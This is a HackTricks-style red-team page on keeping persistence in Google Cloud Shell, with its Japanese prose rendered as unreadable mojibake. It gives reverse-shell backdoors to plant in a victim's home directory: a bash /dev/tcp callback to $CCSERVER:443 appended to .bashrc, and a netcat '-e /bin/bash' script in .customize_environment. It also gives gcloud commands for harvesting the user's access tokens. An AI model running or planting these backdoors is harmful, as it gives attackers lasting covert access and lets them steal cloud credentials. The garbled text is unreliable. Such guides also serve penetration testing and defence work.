# GCP - Cloud Shell æ°¸ç¶šæ€§

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
*
*
* &#x20;githubãƒªãƒã‚¸ãƒˆãƒªã€‚

</details>

## Cloud Shell

è©³ç´°ã«ã¤ã„ã¦ã¯ã€ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### æ°¸ç¶šçš„ãƒãƒƒã‚¯ãƒ‰ã‚¢

[**Google Cloud Shell**](https://cloud.google.com/shell/)ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ç›´æ¥ã‚¯ãƒ©ã‚¦ãƒ‰ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã—ã€é–¢é€£ã™ã‚‹ã‚³ã‚¹ãƒˆã¯ã‹ã‹ã‚Šã¾ã›ã‚“ã€‚

Googleã®Cloud Shellã«ã¯ã€**ã‚¦ã‚§ãƒ–ã‚³ãƒ³ã‚½ãƒ¼ãƒ«**ã‹ã‚‰ã€ã¾ãŸã¯**`gcloud cloud-shell ssh`**ã‚’å®Ÿè¡Œã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ã“ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«ã¯æ”»æ’ƒè€…ã«ã¨ã£ã¦èˆˆå‘³æ·±ã„æ©Ÿèƒ½ãŒã„ãã¤ã‹ã‚ã‚Šã¾ã™:

1. **Google Cloudã¸ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ä»»æ„ã®Googleãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯ã€å®Œå…¨ã«èªè¨¼ã•ã‚ŒãŸCloud Shellã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼ˆã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ã‚‚ã€çµ„ç¹”ã®ã‚ªãƒ¼ãƒŠãƒ¼ã§ã‚ã£ã¦ã‚‚å¯èƒ½ã§ã™ï¼‰ã€‚
2. å½“è©²ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã¯ã€æ´»å‹•ãŒãªã„å ´åˆã§ã‚‚å°‘ãªãã¨ã‚‚120æ—¥é–“ã¯ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ç¶­æŒã—ã¾ã™ã€‚
3. çµ„ç¹”ãŒãã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®æ´»å‹•ã‚’ç›£è¦–ã™ã‚‹æ©Ÿèƒ½ã¯**ã‚ã‚Šã¾ã›ã‚“**ã€‚

ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’ä»•æ›ã‘ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå°‘ãªãã¨ã‚‚120æ—¥ã”ã¨ã«GC Shellã«æ¥ç¶šã™ã‚‹é™ã‚Šã€ãƒãƒƒã‚¯ãƒ‰ã‚¢ãŒç”Ÿãæ®‹ã‚Šã€æ”»æ’ƒè€…ã¯å®Ÿè¡Œã™ã‚‹ãŸã³ã«ã‚·ã‚§ãƒ«ã‚’å–å¾—ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚æ¬¡ã®ã‚ˆã†ã«ã—ã¦:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

ãƒ›ãƒ¼ãƒ ãƒ•ã‚©ãƒ«ãƒ€ã«ã¯ã€**`.customize_environment`** ã¨ã„ã†åˆ¥ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã€å­˜åœ¨ã™ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**cloud shell**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**æ¯å›å®Ÿè¡Œã•ã‚Œã¾ã™**ï¼ˆå‰è¿°ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã®ã‚ˆã†ã«ï¼‰ã€‚å‰ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚’æŒ¿å…¥ã™ã‚‹ã‹ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚‚ã®ã‚’æŒ¿å…¥ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ"é »ç¹ã«"cloud shellã‚’ä½¿ç”¨ã™ã‚‹é™ã‚Šã€æ°¸ç¶šæ€§ã‚’ç¶­æŒã—ã¾ã™ï¼š
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
**GCPã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒCloud Shellã§åˆã‚ã¦å®Ÿè¡Œã•ã‚Œã€èªè¨¼ãŒå¿…è¦ãªå ´åˆ**ã€ã‚³ãƒãƒ³ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹å‰ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ–ãƒ©ã‚¦ã‚¶ã«æ‰¿èªã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒ**ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—**ã—ã¾ã™ã€‚äºˆæœŸã—ãªã„ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ãŒè¡¨ç¤ºã•ã‚Œã‚‹ã¨ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãŒç–‘ã„ã‚’æŒã¡ã€æ°¸ç¶šæ€§ã®æ–¹æ³•ã‚’æ½°ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã‚Œã¯ã€æ”»æ’ƒè€…ã¨ã—ã¦cloud shellã‹ã‚‰`gcloud projects list`ã‚’å®Ÿè¡Œã—ãŸéš›ã«ã€ãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§è¡¨ç¤ºã•ã‚Œã‚‹ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã§ã™ã€‚
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

ã—ã‹ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç©æ¥µçš„ã«cloudshellã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ã¯è¡¨ç¤ºã•ã‚Œãšã€æ¬¡ã®æ–¹æ³•ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**åé›†ã§ãã¾ã™**ï¼š
```bash
gcloud auth print-access-token
gcloud auth application-default print-access-token
```
#### SSHæ¥ç¶šãŒç¢ºç«‹ã•ã‚Œã‚‹æ–¹æ³•

åŸºæœ¬çš„ã«ã€ä»¥ä¸‹ã®3ã¤ã®APIã‚³ãƒ¼ãƒ«ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼š

* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:addPublicKey) \[POST]ï¼ˆãƒ­ãƒ¼ã‚«ãƒ«ã§ä½œæˆã—ãŸå…¬é–‹éµã‚’è¿½åŠ ã—ã¾ã™ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start](https://content-cloudshell.googleapis.com/v1/users/me/environments/default:start) \[POST]ï¼ˆã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’èµ·å‹•ã—ã¾ã™ï¼‰
* [https://content-cloudshell.googleapis.com/v1/users/me/environments/default](https://content-cloudshell.googleapis.com/v1/users/me/environments/default) \[GET]ï¼ˆGoogle Cloud Shellã®IPã‚’æ•™ãˆã¦ãã‚Œã¾ã™ï¼‰

ã—ã‹ã—ã€ã•ã‚‰ã«è©³ã—ã„æƒ…å ±ã¯[https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

* **HackTricksã«åºƒå‘Šã‚’æ²è¼‰ã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹
*
*
* &#x20;githubãƒªãƒã‚¸ãƒˆãƒªã€‚

</details>
